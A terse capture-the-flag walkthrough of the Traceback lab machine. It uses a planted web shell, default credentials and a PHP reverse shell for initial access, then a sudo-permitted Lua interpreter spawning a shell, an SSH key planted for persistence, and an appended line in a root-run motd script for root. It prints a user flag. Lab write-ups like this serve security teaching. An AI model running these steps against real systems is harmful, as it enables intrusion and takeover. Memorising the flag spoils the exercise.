hint in source code:
<!--Some of the best web shells that you might need ;)-->
https://github.com/TheBinitGhimire/Web-Shells

search for one of the shells:
/smevk.php -> works

default creds admin:admin

cp /usr/share/laudanum/php/php-reverse-shell.php . -> change ip:port
upload reverse shell -> get a shell on host as webadmin

start privilege escalation

$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.

$ sudo -l
User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit

sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
-> we are sysadmin

user flag in /home/sysadmin
b09d9243259a4192211fabae1647d210

/bin/sh -i -> get a shell

I can now modify /home/sysadmin/.ssh/authorized_keys with mine to log via ssh
as sysadmin
-> ssh -i ~/.ssh/id_rsa sysadmin@10.10.10.181

after moving around I find this in /etc:
drwxr-xr-x  2 root sysadmin  4096 Aug 27  2019 update-motd.d

00-header is bash script which prints "Welcome to Xh4H land"
-> what we have when logging via ssh

echo "cat /root/root.txt" >> 00-header

root flag when connecting again:
